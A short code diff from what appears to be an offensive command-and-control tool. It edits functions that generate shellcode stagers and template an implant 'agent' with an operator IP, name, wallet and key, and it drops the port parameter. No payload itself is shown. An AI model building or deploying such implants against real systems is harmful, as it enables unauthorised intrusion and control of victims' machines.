@@ -88,6 +88,7 @@ def listStagerListener():
     return 0
 
 def generateShellcodeStager(args):
+    args[0] = args[0].replace("+", " ")
     exe, integration, pyIntregation = shellcode_generator.generateShellcode(args[0])
 
     if args[1].lower() == "c#":
@@ -113,16 +114,14 @@ def generateShellcodeStager(args):
 def generateAgent(args):
     agentName = args[0]
     ip = args[1]
-    port = args[2]
-    wallet = args[3]
-    key = args[4]
-    savePath = args[5]
+    wallet = args[2]
+    key = args[3]
+    savePath = args[4]
 
     with open("../../agent/agent.py", "r") as f:
         agent = f.read()
-    
+ 
     agent = agent.replace("CUSTOM_IP", ip)
-    agent = agent.replace("CUSTOM_PORT", port)
     agent = agent.replace("CUSTOM_NAME", agentName)
     agent = agent.replace("CUSTOM_WALLET", wallet)
     agent = agent.replace("CUSTOM_KEY", key)
